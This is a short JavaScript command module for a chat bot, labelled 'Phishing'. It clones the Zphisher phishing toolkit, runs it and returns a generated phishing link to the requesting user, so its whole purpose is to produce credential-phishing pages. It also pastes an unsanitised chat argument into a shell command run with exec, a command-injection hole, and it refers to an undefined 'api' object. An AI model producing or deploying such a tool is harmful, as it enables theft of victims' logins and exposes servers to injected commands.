const { exec } = require("child_process"); // Required to run shell commands
const axios = require("axios"); // Ensure axios is installed via npm

module.exports.config = {
    name: "phish", // Command name
    author: "Chael",
    version: "1.0",
    category: "Phishing",
    description: "Generate a phishing link using Zphisher",
    adminOnly: true, // Only admins can use this command
    usePrefix: true,
    cooldown: 10, // Cooldown to prevent abuse
};

module.exports.run = async function ({ event, args }) {
    try {
        // Get the user's input, if required for specific target selection
        const target = args[0] || "default"; // Use a default or the provided target name

        // Command to clone Zphisher, set up, and generate a phishing link
        const zphisherCommand = `
            git clone https://github.com/htr-tech/zphisher.git &&
            cd zphisher &&
            chmod +x zphisher.sh &&
            echo ${target} | ./zphisher.sh | grep "http" -m 1
        `;

        // Execute the Zphisher script and extract the phishing link
        exec(zphisherCommand, (error, stdout, stderr) => {
            if (error) {
                console.error("Error executing Zphisher:", error);
                return api.sendMessage("Failed to generate phishing link. Check the server setup.", event.sender.id);
            }

            if (stderr) {
                console.error("Zphisher stderr:", stderr);
            }

            // Extract the phishing link from the output
            const phishingLink = stdout.trim();
            if (phishingLink) {
                api.sendMessage(`Phishing link generated: ${phishingLink}`, event.sender.id);
            } else {
                api.sendMessage("Failed to generate a phishing link. Check Zphisher setup.", event.sender.id);
            }
        });
    } catch (error) {
        console.error("Error in the phishing script:", error);
        api.sendMessage("An error occurred while generating the phishing link.", event.sender.id);
    }
};
